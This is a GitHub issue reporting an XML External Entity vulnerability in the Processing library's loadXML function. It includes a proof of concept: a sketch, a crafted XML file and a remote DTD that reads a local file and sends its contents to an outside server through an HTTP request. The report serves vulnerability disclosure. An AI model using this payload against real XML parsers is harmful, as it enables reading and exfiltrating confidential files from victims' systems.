## Description

[![@lpezzolla](https://avatars.githubusercontent.com/u/3677742?u=96d4d1b601cb673347743b9ced50e4c4b83a8fdc&v=4&size=48)](/lpezzolla)[lpezzolla](https://github.com/lpezzolla)opened [on Nov 13, 2018](https://github.com/processing/processing/issues/5706#issue-380289452)
## Issue

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data since it allows arbitrary file inclusion in the XML and the automated execution of HTTP requests (which can be used to exfiltrate the included data) during the parsing of the XML.

## Steps to reproduce

### Example Processing script

```
XML xml;

void setup() {
  xml = loadXML("XXE.xml");
  XML[] data = xml.getChildren("data");
  String exfiltrated_data = data[0].getContent();
  println(exfiltrated_data);
}

```
### Example XML file

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE a [
<!ENTITY % remote_dtd SYSTEM "http://lucapezzolla.com/xxe-test.dtd"> %remote_dtd; ]>
<body>
  <data>&attack;</data>
  <data>Whatever</data>
</body>

```
### Example remote DTD (as stored at the url referenced above)

```
<!ENTITY % lfi SYSTEM "file:///sys/power/image_size">
<!ENTITY % exfiltrate "<!ENTITY attack SYSTEM 'http://lucapezzolla.com/mirror.php?file=%lfi;'>">
%exfiltrate;

```
### Further clarification

The proof of concept provided above retrieves from the remote server the DTD specification. During the execution of loadXML the DTD is then parsed, reading in the example the content of /sys/power/image\_size.

The content of the file is than transmitted through an HTTP request (row 2 of the DTD) to the remote server, that returns the content of $\_REQUEST, providing the console output.
